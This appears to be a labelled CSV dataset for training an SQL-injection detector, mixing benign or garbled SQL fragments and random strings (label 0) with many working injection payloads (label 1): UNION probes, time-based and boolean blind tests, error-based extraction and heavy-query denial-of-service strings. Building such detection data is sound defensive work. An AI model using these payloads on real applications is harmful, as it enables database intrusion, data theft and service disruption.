Query,Label
SELECT * FROM stopped WHERE safe = 'setting' FETCH FIRST 3 ROWS ONLY,0
"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",1
zuk,0
if ( 8812 = 7896 ) select 8812 else drop function xltk--,1
"-8026 or elt ( 8434 = 4516,4516 ) # bsqo",1
"1 ) union all select null,null,null,null,null,null--",1
"-4605"" ) union all select 8542,8542,8542,8542,8542,8542,8542,8542--",1
SELECT COUNT ( tinID ) FROM satisfied,0
6120,0
select sleep ( 5 ) and ( 'vwmx' = 'vwmx,1
"iif ( 9190 = 5059,1,1/0 )",1
jesusa,0
SELECT TOP 3 * FROM through WHERE anyone = 'turn',0
"-5771' ) ) union all select 2833,2833,2833,2833,2833,2833--",1
"1 ) as iupg where 2861 = 2861 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
9.15202E+15,0
"-5225' ) ) as zats where 5629 = 5629 union all select 5629,5629,5629,5629,5629--",1
SELECT *FROM ( SELECT column_name ( s ) FROM,0
1' ) ) as dqdv where 8126 = 8126 and 4595 = 4595#,1
"SELECT * FROM limited WHERE to NOT IN ( 'struck', 'long', 'machine' )",0
SELECT TOP 3 * FROM growth SELECT * FROM catch 3SELECT * FROM mainly,0
1 ) ) as oqyo where 7995 = 7995,1
9.48E+15,0
"1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'khah' like 'khah",1
SELECT * FROM member FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM balloon,0
1' ) ) as vwua where 8099 = 8099 union all select null--,1
-2316' ) ) ) or 8519 = 6010,1
-5291' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'tmpm' = 'tmpm,1
"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#",1
SELECT wealth FROM poem UNION SELECT taken FROM various ORDER BY blew,0
"select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1
2427,0
SELECT COUNT ( explain ) FROM few,0
"1"" ) as qjyu where 2679 = 2679 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"-9256"" ) ) union all select 2977,2977,2977,2977,2977,2977,2977--",1
hengevel,0
1 ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 4703 = 4703,1
SELECT * FROM rain 3,0
-9509' ) where 9303 = 9303 order by 1#,1
SELECT Count ( * ) AS noon,0
"-1305 ) or make_set ( 2298 = 5545,5545 ) and ( 6715 = 6715",1
50422961s,0
SELECT * FROM slave,0
"1"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""ilrk"" = ""ilrk",1
"SELECT * FROM getting WHERE nine IN ( 'string', 'bone', 'judge' )",0
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""poik"" = ""poik",1
"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'bmzj' like 'bmzj",1
"1 ) ) as cbdx where 8998 = 8998 and elt ( 4249 = 4249,7259 ) --",1
"select * from generate_series ( 4465,4465,case when ( 4465 = 6232 ) then 1 else 0 end ) limit 1--",1
SELECT ISNULL ( NULL ) ;,0
"1 ) as obhj where 1789 = 1789 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1
"1%' ) union all select null,null,null--",1
chmara@novolardiseno.ky,0
"select * from users where id = 1 or !<@ union select 1,version ( ) -- 1",1
SELECT option_value FROM wp_options WHERE option_name = '_houzez_property_type_3146' LIMIT 1,0
SELECT AVG ( elephant ) FROM cheese SELECT SUM ( individual ),0
select ( case when ( 4291 = 6937 ) then 4291 else 4291* ( select 4291 from mysql.db ) end ) #,1
SELECT Count ( * ) AS greatly,0
SELECT MIN ( occur ) AS sand FROM capital,0
"1, ( select ( case when ( 5433 = 5433 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1
"-4236' ) union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",1
"1' ) ) as lrnh where 8569 = 8569 union all select null,null,null,null,null--",1
"av. don juan de borbon, s/n",0
"-1993%"" ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""%"" = """,1
DELETE FROM statement,0
SELECT * FROM noise FETCH FIRST 50 PERCENT ROWS ONLY,0
"SELECT bottom, leave, tasteFROM coming WHERE life IS NOT NULL",0
"-7518"" or elt ( 8413 = 3995,3995 ) and ""cpnf"" = ""cpnf",1
"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'csmu' = 'csmu",1
"-8025"" ) or ( 1436 = 4186 ) *4186 and ( ""sqwv"" like ""sqwv",1
"select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",1
"1"" ) as rcnk where 1800 = 1800",1
SELECT * FROM each 3,0
agn,0
SELECT * FROM doctor 3 SELECT * FROM lying,0
"c/ 57 15, 9g",0
"1%"" ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""%"" = """,1
"SELECT * FROM suppose WHERE threw IN ( 'student', 'rope', 'means' )",0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'inec' = 'inec",1
1' ) as xrap where 5523 = 5523 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1
"1%"" ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1' ) ) as cgey where 2130 = 2130 and make_set ( 7914 = 4032,4032 ) --",1
SELECT butter ( s FROM neck RIGHT JOIN,0
"c/ torcuato perez, 69,",0
1' ) ) and sleep ( 5 ) and ( ( 'jiio' like 'jiio,1
"calle duque de zaragoza s/n,",0
SELECT * FROM any WHERE brother NOT LIKE '[roll]%',0
SELECT TOP 3 * FROM influence WHERE rear = 'straight' SELECT * FROM specific,0
-4960' ) union all select 5300--,1
"SELECT COUNT ( open ) , battle FROM several BY direct",0
guinaldo guals,0
-- &password =,1
"-3391' union all select 2024,2024--",1
"select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",1
"-7345%"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""%"" = """,1
"1'|| ( select 'kgfu' from dual where 2607 = 2607 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
liester-okamoto@carloshoya.np,0
"SELECT lionID AS ID, mouse AS own FROM stomach",0
"c/ cels gomis i mestre 171,",0
"1%"" ) union all select null--",1
AND 1 = utl_inaddr.get_host_address ( ( SELECT host_name FROM v$instance ) ) AND 'i' = 'i,1
bordagorry,0
( select ( case when ( 6461 = 1802 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual ),1
SELECT TOP 50 PERCENT * FROM neighbor SELECT * FROM bone FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM shoot,0
"-6996%"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
retiendas,0
SELECT option_value FROM wp_options WHERE option_name = '_options_footer_button_3_link' LIMIT 1,0
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""%"" = """,1
4.47673E+15,0
"select * from users where id = 1 union select @ $$,version ( ) -- 1",1
SELECT TOP 50 PERCENT * FROM military SELECT * FROM danger FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM language,0
1' and ( 3020 = 3020 ) *6703 and 'hnvf' = 'hnvf,1
SELECT AVG ( nails ) FROM principal SELECT SUM ( lungs ),0
1%' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and '%' = ',1
1 ) ) or sleep ( __TIME__ ) #,1
SELECT * FROM cold 3,0
"SELECT Employees.answer, COUNT ( Orders.soilID ) AS chooseFROM ( OrdersINNER JOIN neighborhood ON Orders.occurID = Employees.pondID )",0
"1' ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'ekla' = 'ekla",1
selwart@studentrooms.zr,0
"1%"" ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""%"" = """,1
"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
SELECT tone ( s ) FROM frog,0
SELECT AVG ( chose ) FROM buy SELECT SUM ( beside ),0
SELECT AVG ( history ) FROM famous SELECT SUM ( figure ),0
29491,0
"1%"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
"1"" ) ) as hdyn where 6027 = 6027 union all select null,null,null--",1
SELECT * FROM mostly WHERE soon IN ( SELECT running FROM as ),0
rodolphe,0
"1' in boolean mode ) union all select null,null,null--",1
1' or sleep ( 5 ) #,1
-2745 ) ) as aywp where 9735 = 9735 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
"SELECT COUNT ( conversation ) , under FROM anything BY seen",0
SELECT * FROM sea FETCH FIRST 3 ROWS ONLY,0
mal3it6,0
5316,0
SELECT AVG ( scale ) FROM left,0
"-9208%"" ) ) or 8571 = 8571--",1
1' ) as xiqw where 8507 = 8507 rlike sleep ( 5 ) --,1
SELECT * FROM storm ORDER BY fifty,0
"1%"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
"1%"" ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""%"" = """,1
SELECT AVG ( dropped ) FROM worth,0
c/ cardenal benilloch 171 12?h,0
DELETE FROM dead WHERE rabbit = 'jump',0
"1 ) ) as xebl where 3105 = 3105 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"1%"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""%"" = """,1
"1%' ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
1.85884E+15,0
"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162 ) --",1
"SELECT city,four,spirit,temperature,jump ( ( occur JOIN stepped ON occasionally.over = till.compare ) INNER JOIN oppositeON Orders.manner = disappear.afternoonID )",0
gracindo@ajuntamentbcn2-0.jp,0
"-2190' ) where 8890 = 8890 union all select 8890,8890#",1
3.60E+15,0
"1"" ) where 8588 = 8588",1
"SELECT * FROM highest WHERE locate BETWEEN ""house"" AND ""onto""",0
"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'xjvr' = 'xjvr",1
ardevol herrador,0
"INSERT INTO rays ( fog, rising, tall ) VALUES ( 'rule', 'grabbed', 'been' )",0
"SELECT poet, missing, common FROM reason WHERE doing IS NULL",0
"1'+ ( select immd where 7499 = 7499 union all select null,null,null,null,null,null,null,null#",1
villasequilla,0
aula,0
"pedrosas, las",0
"-7565' ) ) union all select 7745,7745,7745,7745,7745,7745#",1
SELECT COUNT ( butID ) FROM film,0
SELECT roll ( s ) FROM slide LEFT JOIN,0
select ( case when ( 9455 = 6007 ) then 9455 else 9455* ( select 9455 from mysql.db ) end ) #,1
"SELECT COUNT ( song ) , exactly FROM out BY ate",0
SELECT * FROM ( SELECT service FROM bet ),0
"1' ) ) as xrre where 1172 = 1172 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1
SELECT * FROM century ORDER BY tobacco DESC,0
cijuela,0
"-5205' ) ) union all select 8592,8592,8592,8592,8592,8592--",1
"-7939"" ) or 3958 = 6909",1
UPDATE once SET stay = 'smell'WHERE worth = 'dirt',0
select * from users where id = 1.<@$ or 1 = 1 -- 1,1
"calle andres mellado, 83, 12-d",0
katia,0
"-2418'|| ( select 'mdbt' from dual where 3026 = 3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",1
SELECT COUNT ( leaf ) FROM select,0
1' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'cbnc' like 'cbnc,1
cauthen3,0
"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) )",1
"1 ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 4048 = 4048",1
"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'cysu' like 'cysu",1
"1"" ) ) ) and ( 7396 = 6351 ) *6351 and ( ( ( ""xerw"" like ""xerw",1
1' ) as jdmh where 6175 = 6175 rlike sleep ( 5 ) #,1
1'|| ( select 'zccb' from dual where 8911 = 8911,1
1%' ) and 8734 = 5844,1
SELECT AVG ( empty ) FROM collect SELECT SUM ( someone ),0
bravat-a,0
"SELECT column_name ( s ) FROM wherever,everyone",0
17179,0
252,0
SELECT TOP 3 * FROM amount,0
"1"" and 7533 = 7533",1
"1%"" ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ""%"" = """,1
"1' ) ) as jmnw where 6496 = 6496 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
SELECT * FROM border WHERE mighty = shallow,0
"-6760 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # ikqw",1
SELECT * FROM bound WHERE magnet = 'nearly' FETCH FIRST 3 ROWS ONLY,0
"SELECT Orders.anybodyrID, Employees.start, Employees.fill FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.shirtID ORDER BY Orders.jetID",0
"1"" ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""dzse"" = ""dzse",1
"1"" ) where 4964 = 4964",1
sobrecejo,0
SELECT lion ( s ) FROM scale SELECT figure ( s ),0
"1 and ascii ( lower ( substring ( ( select top 1 name from sysobjects where xtype = 'u' ) , 1, 1 ) ) ) > 116",1
"-6747"" or 9323 = 9323#",1
"-4822"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""owbp"" = ""owbp",1
SELECT * FROM jack WHERE view IN ( SELECT known FROM world ),0
UEf,1
1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 4694 = 4694,1
38656027l,0
carlosmara,0
mula,0
SELECT AVG ( cool ) FROM cowboy SELECT SUM ( floor ),0
1 ) ) as wwys where 9248 = 9248,1
or 1 = 1 or '' = ',1
"select * from users where id = 1 or 1#""@ union select 'a',version ( ) -- 1",1
-9668' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1
kingston@professionalhost.com.ag,0
"1 ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 6829 = 6829",1
"1"" ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""isbh"" like ""isbh",1
"-4068' ) ) ) union all select 9491,9491,9491--",1
""" or sleep ( __TIME__ ) = """,1
88903644l,0
1 ) ) as cwyb where 3633 = 3633,1
SELECT COUNT ( bill ) FROM national,0
"1' ) union all select null,null,null,null,null,null--",1
cheyenne,0
SELECT * FROM importance WHERE loud = 'person',0
1 where 5080 = 5080,1
"1%' union all select null,null,null,null,null#",1
SELECT tip FROM leather UNION SELECT evening FROM task ORDER BY coat,0
SELECT reader,0
SELECT * FROM church WHERE obtain = 'addition' FETCH FIRST 3 ROWS ONLY,0
"1' in boolean mode ) union all select null,null#",1
"-6368 ) ) union all select 4646,4646,4646,4646,4646,4646,4646--",1
DELETE FROM organization,0
"1 ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
65358703v,0
SELECT * INTO newtable FROM oldtable WHERE 1 = 0;,0
37130,0
SELECT * FROM cabin 3,0
value'1,1
"1' where 2162 = 2162 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
-4979' ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'ofgg' = 'ofgg,1
"-8454"" or 6872 = 6872",1
"SELECT COUNT ( blanket ) , took FROM none BY seat",0
SELECT AVG ( hand ) FROM term SELECT SUM ( stomach ),0
4a2ho4a2o,0
"SELECT Orders.eightrID, Employees.necessary, Employees.stranger FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.withID ORDER BY Orders.writeID",0
"1' or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"1' ) ) union all select null,null#",1
pilocarpina,0
SELECT distance ( s ) FROM safety UNION,0
"SELECT * FROM coming ORDER BY curve ASC, bigger DESC",0
1' where 9816 = 9816 and 7533 = 7533--,1
"-9770' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1
SELECT * FROM after FETCH FIRST 3 ROWS ONLY,0
despault2,0
SELECT MIN ( buried ) AS clothing FROM call,0
ubraco,0
"-2803"" ) union all select 5337,5337,5337,5337,5337,5337,5337#",1
end and ( 'nchh' = 'nchh,1
"-5043%' ) ) ) union all select 5860,5860,5860,5860,5860#",1
-8080' ) ) order by 1#,1
lorain-ligero@mareventsprotocolosocial.tn,0
( select ( case when ( 9066 = 5598 ) then 1 else 9066* ( select 9066 from information_schema.character_sets ) end ) ),1
"-9858"" or 8592 = 8553",1
"UPDATE Customers SET ContactName = 'Alfred Schmidt', City = 'Frankfurt' WHERE CustomerID = 1;",0
SELECT fire ( s ) FROM see FULL OUTER JOIN,0
if ( 7427 = 7800 ) select 7427 else drop function dgir--,1
"SELECT box AS equally, train AS [weather] FROM cotton",0
SELECT COUNT ( exact ) FROM pound,0
gonzales_thalasso@magadan.com.jm,0
6e1ba,0
tottenham@satellites.py,0
"end and ( ( ( ""revx"" = ""revx",1
besnehard8@itrends.tn,0
SELECT * FROM classroom WHERE apple NOT LIKE '[fun]%',0
"SELECT ProductName, UnitPrice * ( UnitsInStock + COALESCE ( UnitsOnOrder, 0 ) ) FROM Products;",0
"1%"" or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
SELECT * FROM if 3 SELECT * FROM tropical,0
"-2701"" ) ) as wvht where 5401 = 5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",1
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ""%"" = """,1
marracos,0
"1%"" ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""%"" = """,1
d2sa2uer5o,0
"1' ) as yhgk where 9246 = 9246 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
"1"" ) ) as xwrq where 4161 = 4161",1
"1%' ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
1 ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1
"SELECT instance,myself,loose FROM world LEFT JOIN Orders ON disease.harderID = eaten.affect ORDER BY enough.lucky",0
"SELECT ever, coach+ ', ' + list+ ' ' + position+ ', ' + gravity AS famous FROM choose",0
-5580 or 4829 = 1968,1
6.79504E+13,0
"SELECT Orders.hiddenrID, Employees.bone, Employees.safe FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.planID ORDER BY Orders.frequentlyID",0
"1%"" and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
roco daira,0
07194416q,0
"1%' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
SELECT pleasant ( s ) FROM long SELECT such ( s ),0
"1%' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( '%' = '",1
"1"" ) as ipxg where 4031 = 4031 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1
"1 ) union all select null,null,null,null,null,null,null,null--",1
SELECT COUNT ( neighborhood ) FROM expect,0
"1"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""zzca"" = ""zzca",1
"1 ) ) union all select null,null,null,null,null,null,null,null,null#",1
""" or 1 = 1--",1
"SELECT ISNULL ( ""Hello world!"" ) ;",0
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",1
SELECT * FROM ( SELECT claws FROM moon ),0
mathieso,0
santiago de la puebla,0
"-9861' union all select 5710,5710,5710,5710,5710--",1
"-1647' ) ) union all select 3030,3030,3030,3030,3030,3030,3030--",1
SELECT care ( s FROM charge RIGHT JOIN,0
"select * from users where id = 1 -@<@ union select 1,version ( ) -- 1",1
"-3343'|| ( select 'ssvt' where 5179 = 5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",1
dick,0
04or2ativ1,0
"-8933 ) as iiyr where 1974 = 1974 union all select 1974,1974,1974,1974,1974#",1
"SELECT * FROM art ORDER BY carried, herself",0
1 ) where 1090 = 1090 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
FROM ( SELECT DISTINCT tool FROM try ),0
fraccionario,0
"select * from users where id = 1 * ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1",1
1' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'ykjs' like 'ykjs,1
"SELECT familiarID AS ID, ancient AS daughter FROM paper",0
"1' ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( 'gfll' = 'gfll",1
"c/ gustavo adolfo becquer 91,",0
"SELECT * FROM mostly ORDER BY useful ASC, arrive DESC",0
2066,0
"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'aovy' = 'aovy",1
"( select concat ( 0x7171706a71, ( select ( elt ( 7381 = 7381,1 ) ) ) ,0x717a767a71 ) )",1
1' ) ) ) order by 1--,1
